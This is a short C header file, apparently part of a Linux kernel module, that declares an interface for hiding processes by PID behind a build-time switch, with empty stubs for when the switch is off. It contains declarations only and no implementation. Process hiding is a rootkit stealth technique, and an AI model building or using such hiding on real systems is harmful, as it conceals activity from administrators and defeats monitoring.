#ifndef _HIDE_PROC_H
#define _HIDE_PROC_H

#include <linux/types.h>
#include "version_control.h"

#ifdef CONFIG_HIDE_PROC_MODE

int hide_proc_init(void);
void hide_proc_exit(void);
void add_hidden_pid(pid_t pid);
void remove_hidden_pid(pid_t pid);
bool is_pid_hidden(pid_t pid);
void clear_hidden_pids(void);

#else

// If the mode is disabled, define the functions as empty inlines
static inline int hide_proc_init(void) { return 0; }
static inline void hide_proc_exit(void) { }
static inline void add_hidden_pid(pid_t pid) { }
static inline void remove_hidden_pid(pid_t pid) { }
static inline bool is_pid_hidden(pid_t pid) { return false; }
static inline void clear_hidden_pids(void) { }

#endif

#endif // _HIDE_PROC_H
